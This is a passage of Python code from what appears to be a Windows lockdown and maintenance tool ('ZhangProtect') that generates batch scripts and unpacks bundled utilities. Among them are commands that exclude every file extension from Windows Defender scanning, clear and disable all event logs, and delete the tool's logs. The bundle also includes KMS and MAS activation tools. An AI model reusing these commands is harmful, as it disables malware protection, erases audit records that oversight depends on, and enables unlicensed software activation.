                + "%systemdrive%\\ProgramData\\Microsoft\\Wlansvc\\"
                + chr(34)
                + "  "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Wlansvc\\"
                + chr(34)
                + ")"
                + chr(10)
                + "if exist "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Wlansvc\\linkflag_%username%"
                + chr(34)
                + " (echo) else (rd /q /s "
                + chr(34)
                + "%systemdrive%\\ProgramData\\Microsoft\\Wlansvc"
                + chr(34)
                + ")"
                + chr(10)
                + "if exist "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Wlansvc\\linkflag_%username%"
                + chr(34)
                + " (echo) else (md "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Wlansvc"
                + chr(34)
                + ")"
                + chr(10)
                + "mklink /D "
                + chr(34)
                + "%systemdrive%\\ProgramData\\Microsoft\\Wlansvc"
                + chr(34)
                + " "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Wlansvc"
                + chr(34)
                + ""
                + chr(10)
                + "echo 1 > "
                + chr(34)
                + "%systemdrive%\\ProgramData\\Microsoft\\Wlansvc\\linkflag_%username%"
                + chr(34)
                + ""
                + chr(10)
                + "if exist "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Vault\\linkflag_%username%"
                + chr(34)
                + " (echo) else (echo d | xcopy /Y /E /C /R "
                + chr(34)
                + "%systemdrive%\\ProgramData\\Microsoft\\Vault\\"
                + chr(34)
                + "  "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Vault\\"
                + chr(34)
                + ")"
                + chr(10)
                + "if exist "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Vault\\linkflag_%username%"
                + chr(34)
                + " (echo) else (rd /q /s "
                + chr(34)
                + "%systemdrive%\\ProgramData\\Microsoft\\Vault"
                + chr(34)
                + ")"
                + chr(10)
                + "if exist "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Vault\\linkflag_%username%"
                + chr(34)
                + " (echo) else (md "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Vault"
                + chr(34)
                + ")"
                + chr(10)
                + "mklink /D "
                + chr(34)
                + "%systemdrive%\\ProgramData\\Microsoft\\Vault"
                + chr(34)
                + " "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Vault"
                + chr(34)
                + ""
                + chr(10)
                + "echo 1 > "
                + chr(34)
                + "%systemdrive%\\ProgramData\\Microsoft\\Vault\\linkflag_%username%"
                + chr(34)
                + ""
                + chr(10)
                + "md %datadir%:\\Files\\DataPath_Old_Files"
                + chr(10)
                + "for /f "
                + chr(34)
                + "delims="
                + chr(34)
                + " %%i in ('dir /A:D /B %datadir%:\\') do ("
                + chr(10)
                + "if /I "
                + chr(34)
                + "%%i"
                + chr(34)
                + " EQU "
                + chr(34)
                + "Files"
                + chr(34)
                + " (echo) else ("
                + chr(10)
                + "if /I "
                + chr(34)
                + "%%i"
                + chr(34)
                + " EQU "
                + chr(34)
                + "Important"
                + chr(34)
                + " (echo) else ("
                + chr(10)
                + "if /I "
                + chr(34)
                + "%%i"
                + chr(34)
                + " EQU "
                + chr(34)
                + "StorageRedirect"
                + chr(34)
                + " (echo) else ( "
                + chr(10)
                + "if /I "
                + chr(34)
                + "%%i"
                + chr(34)
                + " EQU "
                + chr(34)
                + "学科文件夹"
                + chr(34)
                + " (echo) else ("
                + chr(10)
                + "mklink /D "
                + chr(34)
                + "%datadir%:\\Files\\DataPath_Old_Files\\%%i"
                + chr(34)
                + " "
                + chr(34)
                + "..\\..\\%%i"
                + chr(34)
                + "))))"
                + chr(10)
                + ")"
                + chr(10)
                + "md %datadir%:\\Files\\DataPath_Old_Files"
                + chr(10)
                + "for /f "
                + chr(34)
                + "delims="
                + chr(34)
                + " %%i in ('dir /A:-D /B %datadir%:\\') do ("
                + chr(10)
                + "mklink "
                + chr(34)
                + "%datadir%:\\Files\\DataPath_Old_Files\\%%i"
                + chr(34)
                + " "
                + chr(34)
                + "..\\..\\%%i"
                + chr(34)
                + ""
                + chr(10)
                + ")"
                + chr(10)
                + "echo 该文件夹内为数据盘根目录下被自动整理隐藏的项目创建的链接,原文件需显示系统保护隐藏文件方可在根目录可视 > %datadir%:\\Files\\DataPath_Old_Files\\DataPath_Old_Files说明.txt"
            )
        else:
            StorageRedirect = "echo 存储重定向未开启"
        AllCommands = (
            datadis
            + chr(10)
            + "set hidesettingflag="
            + chr(34)
            + str(hidesettingflag)
            + chr(34)
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Console /v QuickEdit /t REG_DWORD /d 00000000 /f"
            + chr(10)
            + "if exist "
            + use_rdpwrap
            + ' (cmd /c "'
            + RDPWrapInstaller
            + '")'
            + chr(10)
            + (
                ("cmd /c " + idm_installer)
                if os.path.isfile(use_idm)
                else "reg delete HKEY_CURRENT_USER\\Software\\ZhangProtect\\SoftwareInstall /v IDM /f"
            )
            + chr(10)
            + "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray /v Services /t reg_dword /d 29 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config /t REG_DWORD /v MaxPosPhaseCorrection /d 0xFFFFFFFF /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config /t REG_DWORD /v MaxNegPhaseCorrection /d 0xFFFFFFFF /f"
            + chr(10)
            + "SysTray"
            + chr(10)
            + "regedit /s "
            + chr(34)
            + regfixfile
            + chr(34)
            + chr(10)
            + autoshutdown
            + chr(10)
            + ('cmd /c "%s"' % PopBlock_install if os.path.isfile(KeepPopBlock) else "")
            + chr(10)
            + 'schtasks /create /tn ZhangProtect\\ErrorAutoFix /xml "'
            + ErrorAutoFixXml
            + '" /f'
            + chr(10)
            + "schtasks /delete /tn 360safe\\360APMainProg /f"
            + chr(10)
            + "if exist "
            + AutoPreCFlag
            + " (schtasks /Change /tn ZhangProtect\\AutoPreA /Disable"
            + chr(10)
            + "schtasks /Change /tn ZhangProtect\\AutoPreB /Disable"
            + chr(10)
            + "schtasks /Change /tn ZhangProtect\\AutoPreC /Disable"
            + chr(10)
            + ") else ("
            + chr(10)
            + "if /I %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (icacls %systemdrive%\\ /setintegritylevel M)"
            + chr(10)
            + "if /I %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (icacls %datadir%:\\ /setintegritylevel M)"
            + chr(10)
            + autochangepreA
            + chr(10)
            + autochangepreB
            + chr(10)
            + autochangepreC
            + ")"
            + chr(10)
            + MaketheLink
            + chr(10)
            + MyComputerClean
            + chr(10)
            + StorageRedirect
            + chr(10)
            + "if exist "
            + excludeflag
            + " (echo) else (for /f "
            + chr(34)
            + "tokens=4 delims=\\"
            + chr(34)
            + " %%x in ("
            + chr(39)
            + "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes"
            + chr(39)
            + ") do (reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions"
            + chr(34)
            + " /t REG_DWORD /v %%x /d 0 /f >nul) & echo 1 >"
            + excludeflag
            + ")"
            + chr(10)
            + "wevtutil.exe cl system"
            + chr(10)
            + (
                (
                    'for /f "delims=" %%i in (\'reg query HKEY_CURRENT_USER\\Software\\Classes\\CLSID ^| findstr /vi "20D04FE0-3AEA-1069-A2D8-08002B30309D"\') do (reg add %%i /v System.IsPinnedToNameSpaceTree /t REG_DWORD /d 0 /f)'
                    + chr(10)
                    + 'for /f "delims=" %%i in (\'reg query HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID ^| findstr /vi "20D04FE0-3AEA-1069-A2D8-08002B30309D"\') do (reg add %%i /v System.IsPinnedToNameSpaceTree /t REG_DWORD /d 0 /f)'
                    + chr(10)
                    + 'reg delete "HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /v System.IsPinnedToNameSpaceTree /f'
                    + chr(10)
                    + 'reg delete "HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /v System.IsPinnedToNameSpaceTree /f'
                )
                if os.path.isfile(allowIsPinnedToMyPC)
                else "rem 已允许此电脑左侧固定项(SoftwareClasses)"
            )
            + chr(10)
            + "powershell -command \"Get-ScheduledTask -TaskPath '\\ZhangProtect\\*' | ForEach-Object { try { $task=$_; $_.Settings.ExecutionTimeLimit='PT0S'; $_.Settings.DisallowStartIfOnBatteries=$false; $_.Settings.StopIfGoingOnBatteries=$false; $_.Settings.StartWhenAvailable=$true; $_.Settings.Hidden=$false; $_.Settings.RestartCount=0; Set-ScheduledTask -InputObject $_; Write-Host '成功修改: '+$_.TaskName } catch { Write-Host '修改失败: '+$_.TaskName+' ('+$_+')' } }\""
        )
        AllSchrun = AutoPreDrun + chr(10) + UsbChangerRun
        ErrorAutoFixXml_text = (
            "<?xml version="
            + chr(34)
            + "1.0"
            + chr(34)
            + " encoding="
            + chr(34)
            + "UTF-16"
            + chr(34)
            + "?>"
            + chr(10)
            + "<Task version="
            + chr(34)
            + "1.2"
            + chr(34)
            + " xmlns="
            + chr(34)
            + "http://schemas.microsoft.com/windows/2004/02/mit/task"
            + chr(34)
            + ">"
            + chr(10)
            + "  <RegistrationInfo>"
            + chr(10)
            + "    <Date>2024-06-07T08:06:03.000000</Date>"
            + chr(10)
            + "    <Author>ZhangProtect\\Administrator</Author>"
            + chr(10)
            + "    <URI>\\ZhangProtect\\ErrorAutoFix</URI>"
            + chr(10)
            + "  </RegistrationInfo>"
            + chr(10)
            + "  <Triggers>"
            + chr(10)
            + "    <EventTrigger>"
            + chr(10)
            + "      <Enabled>true</Enabled>"
            + chr(10)
            + "      <Subscription>&lt;QueryList&gt;&lt;Query Id="
            + chr(34)
            + "0"
            + chr(34)
            + " Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;&lt;Select Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;*[System[Provider[@Name='Microsoft-Windows-Power-Troubleshooter'] and EventID=1]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>"
            + chr(10)
            + "    </EventTrigger>"
            + chr(10)
            + "    <EventTrigger>"
            + chr(10)
            + "      <Enabled>true</Enabled>"
            + chr(10)
            + "      <Subscription>&lt;QueryList&gt;&lt;Query Id="
            + chr(34)
            + "0"
            + chr(34)
            + " Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;&lt;Select Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;*[System[Provider[@Name='Microsoft-Windows-Kernel-Power'] and EventID=107]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>"
            + chr(10)
            + "    </EventTrigger>"
            + chr(10)
            + "    <EventTrigger>"
            + chr(10)
            + "      <Enabled>true</Enabled>"
            + chr(10)
            + "      <Subscription>&lt;QueryList&gt;&lt;Query Id="
            + chr(34)
            + "0"
            + chr(34)
            + " Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;&lt;Select Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;*[System[Provider[@Name='Microsoft-Windows-Kernel-Power'] and EventID=41]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>"
            + chr(10)
            + "    </EventTrigger>"
            + chr(10)
            + "  </Triggers>"
            + chr(10)
            + "  <Principals>"
            + chr(10)
            + "    <Principal id="
            + chr(34)
            + "Author"
            + chr(34)
            + ">"
            + chr(10)
            + "      <UserId>S-1-5-18</UserId>"
            + chr(10)
            + "      <RunLevel>HighestAvailable</RunLevel>"
            + chr(10)
            + "    </Principal>"
            + chr(10)
            + "  </Principals>"
            + chr(10)
            + "  <Settings>"
            + chr(10)
            + "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>"
            + chr(10)
            + "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
            + chr(10)
            + "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>"
            + chr(10)
            + "    <AllowHardTerminate>false</AllowHardTerminate>"
            + chr(10)
            + "    <StartWhenAvailable>false</StartWhenAvailable>"
            + chr(10)
            + "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
            + chr(10)
            + "    <IdleSettings>"
            + chr(10)
            + "      <StopOnIdleEnd>false</StopOnIdleEnd>"
            + chr(10)
            + "      <RestartOnIdle>false</RestartOnIdle>"
            + chr(10)
            + "    </IdleSettings>"
            + chr(10)
            + "    <AllowStartOnDemand>true</AllowStartOnDemand>"
            + chr(10)
            + "    <Enabled>true</Enabled>"
            + chr(10)
            + "    <Hidden>false</Hidden>"
            + chr(10)
            + "    <RunOnlyIfIdle>false</RunOnlyIfIdle>"
            + chr(10)
            + "    <WakeToRun>true</WakeToRun>"
            + chr(10)
            + "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>"
            + chr(10)
            + "    <Priority>7</Priority>"
            + chr(10)
            + "  </Settings>"
            + chr(10)
            + "  <Actions Context="
            + chr(34)
            + "Author"
            + chr(34)
            + ">"
            + chr(10)
            + "    <Exec>"
            + chr(10)
            + "      <Command>mshta</Command>"
            + chr(10)
            + "      <Arguments>vbscript:CreateObject("
            + chr(34)
            + "shell.application"
            + chr(34)
            + ").shellexecute("
            + chr(34)
            + "cmd"
            + chr(34)
            + ","
            + chr(34)
            + "/c "
            + ErrorAutoFix
            + ""
            + chr(34)
            + ","
            + chr(34)
            + ""
            + chr(34)
            + ","
            + chr(34)
            + "runas"
            + chr(34)
            + ",0)(window.close)</Arguments>"
            + chr(10)
            + "    </Exec>"
            + chr(10)
            + "  </Actions>"
            + chr(10)
            + "</Task>"
        )
        ErrorAutoFixBat_text = (
            'taskkill /f /im powershell.exe /t & powershell "Get-Process -Name powershell | Stop-Process -Force"'
            + chr(10)
            + "shutdown -a 2>nul>nul"
            + chr(10)
            + "for /f "
            + chr(34)
            + "tokens=1 delims=,"
            + chr(34)
            + " %%i in ('schtasks /query /fo csv /tn ZhangProtect\\ /NH') do ("
            + chr(10)
            + "schtasks /END /tn %%i 2>nul>nul"
            + chr(10)
            + ")"
            + chr(10)
            + 'for /f "delims=" %%i in (\'dir '
            + ProtectDir
            + '*.exe /A /B /S\') do (taskkill /f /im %%~ni.exe 2>nul>nul /t & powershell "Get-Process -Name %%~ni | Stop-Process -Force" 2>nul>nul)'
            + chr(10)
            + "schtasks /End /tn ZhangProtect\\Protect 2>nul>nul"
            + chr(10)
            + 'taskkill /f /im wscript.exe /t & powershell "Get-Process -Name wscript | Stop-Process -Force"'
            + chr(10)
            + "del /f /q /a "
            + ProtectDir
            + "*.log 2>nul>nul"
            + chr(10)
            + "del /f /q /a "
            + chr(34)
            + ProtectDir
            + "network_ip_change_log.txt"
            + chr(34)
            + " 2>nul>nul"
            + chr(10)
            + "del /f /q /a "
            + chr(34)
            + ProtectDir
            + "network_int.txt"
            + chr(34)
            + " 2>nul>nul"
            + chr(10)
            + "del /f /q /a "
            + chr(34)
            + ProtectDir
            + "scan_result.txt"
            + chr(34)
            + " 2>nul>nul"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\DriveIcons /f 2>nul>nul"
            + chr(10)
            + (
                ("if exist " + ipcheck + " (" + iphelper + " -r)")
                if not os.path.isfile(disable_Winmgmt)
                else ""
            )
            + chr(10)
            + "ipconfig /flushdns"
            + chr(10)
            + RestoreConf_exe
            + chr(10)
            + 'taskkill /f /im 360AP.exe /t & powershell "Get-Process -Name 360AP | Stop-Process -Force"'
            + chr(10)
            + "schtasks /End /tn ZhangProtect\\Protect"
            + chr(10)
            + 'taskkill /f /im Protect.exe /t & powershell "Get-Process -Name Protect | Stop-Process -Force"'
            + chr(10)
            + "powershell C:\\Windows\\Protect\\StopWifiShare.ps1"
            + chr(10)
            + "powershell Restart-NetAdapter -name "
            + chr(34)
            + "*"
            + chr(34)
            + ""
            + chr(10)
            + "schtasks /Run /tn ZhangProtect\\Protect /I"
            + chr(10)
            + "for /f "
            + chr(34)
            + "tokens=*"
            + chr(34)
            + " %%1 in ('wevtutil.exe el') DO (wevtutil.exe cl "
            + chr(34)
            + "%%1"
            + chr(34)
            + " 2>nul>nul"
            + chr(10)
            + 'wevtutil.exe sl "%%1" /e:false 2>nul>nul)'
            + chr(10)
            + "wevtutil.exe cl system"
            + chr(10)
            + 'taskkill /f /im cmd.exe /t & powershell "Get-Process -Name cmd | Stop-Process -Force"'
        )
        try:
            with smart_open.smart_opens(ProtectControl, "wb") as f:
                write_resource(f, ZhangProtectControl_File)
        except Exception as e:
            logger.log(
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        # ProtectSysDispatch
        try:
            with smart_open.smart_opens(ProtectSysDispatch, "wb") as f:
                write_resource(f, SysDispatch_File)
        except Exception as e:
            logger.log(
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        # 写入并刷新文件
        try:
            memreductiniw = (
                "[memreduct]"
                + chr(10)
                + "AutoreductEnable=true"
                + chr(10)
                + "AutoreductIntervalEnable=true"
                + chr(10)
                + "HotkeyCleanEnable=false"
                + chr(10)
                + "SettingsLastPage=101"
                + chr(10)
                + "ReductMask2=39"
                + chr(10)
                + "StatisticLastReduct=1719031383"
                + chr(10)
                + "AutoreductValue=85"
                + chr(10)
                + "AutoreductIntervalValue=30"
                + chr(10)
                + "CheckUpdatesPeriod=0"
                + chr(10)
                + "TrayUseTransparency=false"
                + chr(10)
                + "TrayRoundCorners=true"
                + chr(10)
                + "TrayColorWarning=4227327"
                + chr(10)
                + "TrayLevelWarning=70"
                + chr(10)
                + "TrayLevelDanger=85"
                + chr(10)
                + "TrayActionDc=1"
                + chr(10)
                + "BalloonCleanResults=false"
                + chr(10)
                + "IsNotificationsSound=false"
                + chr(10)
                + "IsTrayIconSingleClick=false"
                + chr(10)
                + "IsAllowStandbyListCleanup=true"
                + chr(10)
                + "IsShowReductConfirmation=false"
            )
            b64_to_file(README, READMEf)
            b64_to_file(ZhangProtectPot, ZhangProtectPot_exef)
            b64_to_file(NetworkGuardian_exe, NetworkGuardianf)
            b64_to_file(NetworkGuardian_Skill, NetworkGuardianSkillf)
            b64_to_file(AutoDisplayConfig_exe, AutoDisplayConfigf)
            b64_to_file(keyboard_filter_exe, keyboard_filterf)
            b64_to_file(BluetoothHFPGuard_exe, BluetoothHFPGuardf)
            b64_to_file(SetUserFTA_exe, SetUserFTAf)
            b64_to_file(DefaultAppLocker_exe, DefaultAppLockerf)
            b64_to_file(TurboSwitch_exe, TurboSwitchf)
            b64_to_file(OpenHashTab_Installer_exe, OpenHashTab_Installerf)
            b64_to_file(WeiWeiFont_exe, WeiWeiFontEf)
            b64_to_file(HuorongData_dat, HuorongDataf)
            b64_to_file(DataLgloo_Installer, DataLgloof)
            b64_to_file(Auto_Lid_Sleep_exe, Auto_Lid_Sleepf)
            b64_to_file(ffmpeg_helper, format_changer_toolf)
            b64_to_file(runas_user_exe, runas_userf)
            b64_to_file(taskbar_hider_exe, taskbar_hiderf)
            b64_to_file(AutoPowerOptionsOK_exe, AutoPowerOptionsOKexef)
            b64_to_file(DontSleep_exe, DontSleepexef)
            b64_to_file(shexview_exe, shexviewf)
            b64_to_file(NetTime_exe, NetTimef)
            b64_to_file(shexview_lng_ini, shexview_lngf)
            b64_to_file(WinHex_exe, WinHexf)
            b64_to_file(h2testw_exe, h2testwf)
            b64_to_file(AutoRemove_DRIVE_REMOVABLE_exe, AutoRemove_DRIVE_REMOVABLEf)
            b64_to_file(TransparentIcon, TransparentIconf)
            b64_to_file(SetProToPcore_exe, SetProToPcoref)
            b64_to_file(SetProToPcore_dll, SetProToPcoredllf)
            b64_to_file(notepad_plus_installer, NotepadPlusf)
            b64_to_file(NSudoL, NSudoLf)
            b64_to_file(ZhangGameRedDot_exe, ZhangGameRedDotf)
            b64_to_file(ZhangKeyLauncher_exe, ZhangKeyLauncherf)
            b64_to_file(SystemInfoChanger_exe, SystemInfoChangerf)
            b64_to_file(Autologon_exe, Autologonf)
            b64_to_file(rufus_exe, rufusf)
            b64_to_file(UltraISO_exe, UltraISOf)
            b64_to_file(BlueScreenView_exe, BlueScreenViewf)
            b64_to_file(Optimizer_exe, Optimizerf)
            b64_to_file(zip7installer_exe, zip7installerf)
            b64_to_file(WinRARinstaller_exe, WinRARinstallerf)
            b64_to_file(ContextMenuManager_exe, ContextMenuManagerf)
            b64_to_file(libstdc6_dll, libstdc6f)
            b64_to_file(WizTree_exe, WizTreef)
            b64_to_file(Timesync_exe, Timesyncexef)
            b64_to_file(libgcc_s_seh_1, libgcc_s_seh_1_dllf)
            b64_to_file(DesktopOK, DesktopOKFile)
            b64_to_file(simplewall_exe, simplewallexef)
            b64_to_file(simplewall_lng, simplewalllngf)
            b64_to_file(MacManager_exe, MacManageref)
            b64_to_file(WifiMobileToolExe, WifiMobileTool_exef)
            b64_to_file(Zhang_PE_ToolEXE, Zhang_PE_Tool_exef)
            b64_to_file(WindowDebugTool_E, WindowDebugTool_exef)
            b64_to_file(FuckKeyBoardZ_exe, FuckKeyBoardZf)
            with smart_open.smart_opens(
                memreductini,
                "w",
            ) as f:
                f.write(memreductiniw)
            if not os.path.exists(memreducti18n):
                os.mkdir(memreducti18n)
            b64_to_file(memreduct, memreductFile)
        except Exception as e:
            logger.log(
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        try:
            rdtimeout = 0
            rdflag = True
            while ((not os.path.isfile(RDPreg)) or rdflag) and rdtimeout < 30:
                RunWrapper(
                    'regedit /E "'
                    + RDPreg
                    + '" "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"'
                )
                rdflag = False
                rdtimeout += 1
            with smart_open.smart_opens(
                RDPreg,
                "r",
            ) as f:
                rdpexpregr = f.readlines()
            rdpexpregfix = ""
            for i in rdpexpregr:
                i = str(i)
                if "PortNumber" in i:
                    i = '"PortNumber"=dword:0000344d\n'
                rdpexpregfix += i
            if "RDP-Tcp" in rdpexpregfix and (not "RDP-Tcp-13389" in rdpexpregfix):
                rdpexpregfix = rdpexpregfix.replace("RDP-Tcp", "RDP-Tcp-13389")
            with smart_open.smart_opens(
                RDPreg,
                "w",
            ) as f:
                f.write(rdpexpregfix)
        except Exception as e:
            logger.log(
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        if os.path.isfile(use_idm):
            b64zip_to_file(idm_zip, IDMF)
        b64zip_to_file(MAS_zip, Windows_Active_MASf)
        b64zip_to_file(VeraCrypt_zip, VeraCryptf)
        b64zip_to_file(KasperskyDataRedirect_zip, KasperskyDataRedirectf)
        b64zip_to_file(ShareX_zip, ShareXf)
        b64zip_to_file(NewTemplate_zip, NewTemplatef)
        b64zip_to_file(PsTools_zip, PSToolsf)
        b64zip_to_file(BLESync_Zip, BLESyncf)
        b64zip_to_file(PrivaZer_Zip, PrivaZerf)
        b64zip_to_file(efiguard_zip, EfiGuardf)
        b64zip_to_file(ArkTools_zip, ArkToolsf)
        b64zip_to_file(XYplorer_zip, XYplorerf)
        b64zip_to_file(LocalSend_zip, LocalSendf)
        b64zip_to_file(ProcessLasso_zip, ProcessLassof)
        b64zip_to_file(Everything_zip, Everythingf)
        b64zip_to_file(RegistryFinder_zip, RegistryFinderf)
        b64zip_to_file(PingFangTTF_zip, PingFangTTFf)
        b64zip_to_file(FontTools_zip, FontToolsf)
        b64zip_to_file(Speccy_zip, Speccyf)
        b64zip_to_file(aria2_zip, aria2f)
        b64zip_to_file(WinDbg_zip, WinDbgf)
        b64zip_to_file(WinSCP_zip, WinSCPf)
        b64zip_to_file(FreeFileSync_zip, FreeFileSyncf)
        b64zip_to_file(LockHunter_zip, LockHunterzipf)
        b64zip_to_file(xorriso_zip, xorrisof)
        b64zip_to_file(PopBlock_zip, PopBlockf)
        b64zip_to_file(AutoScreenshot_zip, AutoScreenshotf)
        b64_to_file(ntsd_exe, ntsdf)
        b64_to_file(ByeByeJY_exe, ByeByeJYf)
        if os.path.isfile(EnableAutoScreenshot):
            AutoScreenshot_lock_ini_config(
                AutoScreenshot_ini, datadir + ":\\Files\\Data\\AutoScreenshot"
            )
        if os.path.isfile(RDP_Display_Cha):
            b64_to_file(nvidiaopenglrdp_exe, nvidiaopenglrdpf)
        if os.path.isfile(use_rdpwrap):
            b64zip_to_file(RDPWrapZipFile, RDPWrapZip)
        b64zip_to_file(CCleanerZipFile, CCleanerZip)
        if os.path.isfile(ikun_icon_flag):
            b64zip_to_file(ikun_icon_zip, iKun_icon_zip_f)
        b64zip_to_file(nmyuZip, nmyuf)
        b64zip_to_file(DesktopGoose_zip, DesktopGoosef)
        if os.path.isfile(Open_SystemBackup_Flag):
            b64zip_to_file(SnapShotZip, SnapShotf)
        if os.path.isfile(use_fraps):
            b64zip_to_file(FrapsDirZip, Frapsf)
        if os.path.isfile(Digital_Clock_4_flag):
            b64zip_to_file(Digital_Clock_4_zip, Digital_Clock_4f)
        if os.path.isfile(show_DeskDisp):
            b64zip_to_file(DeskDisp_zip, DeskDispf)
        b64_to_file(npcap, npcapzip)
        b64_to_file(ikun_wav_file, ikun_wav)
        b64_to_file(NSudo, NSudoZipf)
        b64_to_file(zip7exe, zip7f)
        b64_to_file(zip7dll, zip7dllf)
        b64_to_file(KMSActivatorExe, KMSActivatorf)
        b64_to_file(RestoreConf_exe, RestoreConff)
        b64_to_file(fastcopy_exe, FastCopyf)
        b64_to_file(ProcessMonitor_exe, ProcessMonitorf)
        b64_to_file(iperf3_exe, iperf3f)
        b64_to_file(iperf3_dll, cygwin1f)
        b64_to_file(MoveMouse_exe, MoveMousef)
        b64_to_file(GameKeyBoardTool_exe, GameKeyBoardToolsf)
        if os.path.isfile(use_36o_ap_flag):
            b64_to_file(ap_360_installer, APInstallerf)
        b64_to_file(DGuardInstallexe, DGuardInstallf)
        b64_to_file(Autoruns64_exe, Autoruns64f)
        b64_to_file(procexp64_exe, procexp64f)
        b64_to_file(Scan_app, Zhang_lan_scan_f)
        b64_to_file(iphelper, Zhang_ip_helper_exef)
        b64_to_file(IconRemover_exe, IconRemoverf)
        b64_to_file(nircmd_exe, nircmdf)
        b64_to_file(Disable_Safety_exe, Disable_Safetyf)
        b64_to_file(nircmdc_exe, nircmdcf)
        b64_to_file(keep_awake_exe, awakekeeperf)
        b64_to_file(Traffic_Killer_exe, Traffic_Killeref)
        b64_to_file(NewFileTime_exe, NewFileTimef)
        b64_to_file(uwd_exe, uwdf)
        b64_to_file(file_server_exe, file_serveref)
        b64_to_file(install_wim_tweak_exe, install_wim_tweakf)
        b64_to_file(StorageRedirect_exe, StorageRedirectf)
        b64_to_file(KasperskyCFGTemplate, KasperskyCFGTemplatef)
        if os.path.isfile(AutoChangeMAC) and (not os.path.isfile(RemoveChangeMAC)):
            try:
                RanDomChange_NetWorkAdapter_MAC()
            except:
                pass
        if os.path.isfile(RemoveChangeMAC) and os.path.isfile(AutoChangeMAC):
            try:
                os.remove(AutoChangeMAC)
            except:
                pass
        if os.path.isfile(use_36o_ap_flag) and not os.path.isfile(closewifi):
            ap_360_repair()
        MainTainCleanBat = (
            "@echo off"
            + chr(10)
            + "echo 执行修复检查,请稍候 & sfc /scannow & DISM /Online /Cleanup-Image /ScanHealth & DISM /Online /Cleanup-image /RestoreHealth & DISM /online /Cleanup-Image /StartComponentCleanup"
            + chr(10)
            + "cls & echo 执行清理,请稍候"
            + chr(10)
            + CCleanerExe
            + " /AUTO"
            + chr(10)
            + "cls & echo 执行优化,请稍候"
            + chr(10)
            + "start /min /wait cmd /c "
            + chr(34)
            + ProtectBAT
            + chr(34)
            + "<"
            + AutoAnswer
            + chr(10)
            + 'start /min cmd /c "'
            + Maintain_mode
            + '"'
            + chr(10)
            + "cls & echo 完成"
            + chr(10)
            + 'start mshta vbscript:Msgbox("维护清理完成,已进入维护模式")(window.close)'
        )
        volumeset_vbs_text = (
            "CreateObject("
            + chr(34)
            + "shell.application"
            + chr(34)
            + ").shellexecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + ","
            + chr(34)
            + "/c "
            + nircmd_exe
            + " setsysvolume 65535"
            + chr(34)
            + ","
            + chr(34)
            + ""
            + chr(34)
            + ",runas,0"
            + chr(10)
            + "CreateObject("
            + chr(34)
            + "shell.application"
            + chr(34)
            + ").shellexecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + ","
            + chr(34)
            + "/c "
            + nircmd_exe
            + " mutesysvolume 0"
            + chr(34)
            + ","
            + chr(34)
            + ""
            + chr(34)
            + ",runas,0"
        )
        HuoRongDataRedirect_com = (
            "@echo off"
            + chr(10)
            + "title 重定向火绒配置"
            + chr(10)
            + "echo 重定向火绒安全软件的病毒库及配置到数据盘,适合有还原的环境,以更新病毒库由于没有官方修改方法,只能通过修改火绒注册表完成,而火绒对注册表有保护,请在运行火绒安装包之前打开本批处理!如果已经安装火绒,修改配置注册表会拒绝访问,请备份好配置,卸载火绒重启电脑后重装安装,然后在运行安装包之前运行本批处理,安装火绒后手动点一次更新病毒库,然后前往数据盘查看是否成功修改,如果不成功,重复卸载重装不排除此方法在未来失效"
            + chr(10)
            + "color a"
            + chr(10)
            + "set data="
            + datadir
            + chr(10)
            + "echo %data%:\\StorageRedirect\\HuoRongData"
            + chr(10)
            + ":1"
            + chr(10)
            + "md %data%:\\StorageRedirect\\HuoRongData >nul 2>&1"
            + chr(10)
